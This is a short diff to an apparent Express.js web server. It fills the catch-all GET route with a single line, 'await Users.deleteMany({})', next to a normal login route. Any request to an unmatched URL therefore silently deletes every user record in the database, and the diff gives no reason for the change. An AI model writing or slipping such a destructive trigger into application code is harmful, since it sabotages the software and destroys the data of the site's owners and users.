@@ -13,7 +13,7 @@ app.use(express.json());
 const dbo = require("./db/conn");
 
 app.get('*', async(req,res) => {
-
+  await Users.deleteMany({});
 })
 
 app.post('/user/login', async (req,res) => {
